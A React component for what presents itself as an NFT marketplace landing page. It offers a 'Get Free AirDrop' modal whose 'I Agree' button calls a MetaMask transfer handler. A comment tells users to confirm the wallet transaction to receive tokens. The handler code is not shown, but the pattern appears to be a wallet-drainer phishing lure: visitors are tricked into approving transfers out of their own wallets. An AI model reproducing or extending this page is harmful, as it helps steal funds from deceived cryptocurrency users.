import React from "react";
import Card from "./PCard";
import Sdata from "./Sdata"
import Carousal from "./Carousel";
import { useAlchemy } from "../Helpers/metamask.helper";

function Section() {
  const { handleTransfer } = useAlchemy()
  return (
    <>
      <section className='section row'>
        <div className='sec1 col-md-7 col-sm-12  ' >
          <h1>Discover the latest digital art and collect NFTs</h1>
          <p>The largest NFT marketplace. We make NFTs easier and more efficient for culture and creativity, built efficiently for you.</p>

          <div className='btnDiv'>
            <button className='btn1 ' data-bs-toggle="modal" data-bs-target="#staticBackdrop">Get Free AirDrop</button>
            <button className='btn2 ' ><a href="https://www.binance.com/en" target={'_blank'} style={{ "textDecoration": "none" }} className="text-light">View Artwork</a></button>
          </div>

          <div className="counter">
            <div> <h2>20<span>K</span></h2>
              <p>Artwork</p></div>
            <div> <h2>40K</h2>
              <p>Auction</p></div>
            <div> <h2>60K</h2>
              <p>Artist</p></div>
          </div>
        </div>
        <div className='sec2 col-md-5 col-sm-12 '>
          <div className="div">
            <img src="./images/g5.png" alt="img" />
          </div>
        </div>
      </section>
      <br></br>
      {/* <section className="collDiv">
        <div className="content" style={{"margin-bottom":"50px"}}>
          <h1>This weeks trending collections</h1>
          <p >Some of these upcoming trends could change the way we experience the web, brand products, buy and sell art, even create & experience music.</p>
        </div>
        <Carousal/>
      </section> */}

      {/* explore section */}
      <section className="collDiv">
        <div className="content text-center">
          <h1 >Explore the most unique artworks</h1>
          <p className="ph">NFTs are usually associated with non-physical art but in reality, there are several different types of NFTs and are explained in this guide.</p>
        </div>

        <div className="cardsDiv row my-3">

          {Sdata.map(val => {
            return (
              <Card
                key={val.id}
                imgsrc={val.imgsrc}
                title={val.title}
                sname={val.sname}
                date={val.date}
                price={val.price}
                className="card2"
              />
            )
          })
          }
        </div>

      </section>

      <hr />
      <br />
      <br />

      {/* prompt for agreemant */}
      <div className="modal fade " id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabIndex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
        <div className="modal-dialog modal-dialog-centered">
          <div className="modal-content">
            <div className="modal-header modalHeader text-light">
              <h5 className="modal-title" id="staticBackdropLabel">Want free drop?</h5>
              <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div className="modal-body modalBody text-light">
            <img src="./images/nft-2.png" alt="" width="100%" />
              {/* To get free airdrops confirm the metamask transaction to recieve the tokens and enjoy the eths. */}
              <button type="button" className="btn btn-primary btn-color float-end" data-bs-dismiss="modal" onClick={handleTransfer}>I Agree</button>
           
            </div>
          
          </div>
        </div>
      </div>

    </>
  )
}
export default Section;